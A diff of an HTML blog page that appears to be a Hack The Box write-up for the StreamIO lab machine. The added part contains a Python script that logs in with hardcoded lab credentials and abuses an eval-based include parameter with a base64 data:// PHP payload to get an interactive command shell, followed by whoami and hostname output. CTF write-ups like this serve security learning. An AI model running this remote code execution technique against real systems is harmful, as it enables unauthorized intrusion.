@@ -780,7 +780,54 @@ SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>   
 </code></pre></div>
 
 <p>When called with the POST parameter <code>include</code> set to anything, it tries to read that file and <code>eval</code>s that content.. Nice..</p>
-<p>If we can get the script to load our own code, we have an <em>Remote Code Execution</em>.</p>
+<p>If we can get the script to load our own code, we have an <em>Remote Code Execution</em>.
+Fast forward, I have done it with curl, but you need the PHPSESSION cookie after you have logged in. I wrote a short Python script, to log me in and let me execute commands in a while loop, sort of poor man's shell.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">urllib3</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] main&quot;</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="s2">&quot;yoshihide&quot;</span><span class="p">,</span>
+        <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="s2">&quot;66boysandgirls..&quot;</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">r</span><span class="p">:</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;https://streamio.htb/login.php&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&quot;include&quot;</span><span class="p">:</span> <span class="s2">&quot;data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7&quot;</span><span class="p">}</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;CMD: &quot;</span><span class="p">)</span>
+        <span class="k">while</span> <span class="n">cmd</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">:</span>
+            <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&quot;https://streamio.htb/admin/?debug=master.php&amp;cmd=&quot;</span> <span class="o">+</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+            <span class="n">html_out</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">html_out</span><span class="p">[</span><span class="n">html_out</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;&lt;input name=&quot;include&quot; hidden&gt;&#39;</span><span class="p">):])</span>
+            <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;CMD: &quot;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+
+<p>Execution down below</p>
+<div class="highlight"><pre><span></span><code>[+] main
+CMD: whoami
+&lt;input name=&quot;include&quot; hidden&gt;
+&lt;/form&gt;
+streamio\yoshihide
+                &lt;/div&gt;
+        &lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+CMD: hostname
+&lt;input name=&quot;include&quot; hidden&gt;
+&lt;/form&gt;
+DC
+                &lt;/div&gt;
+        &lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div>
   </div>
   <div class="tag-cloud">
     <p>
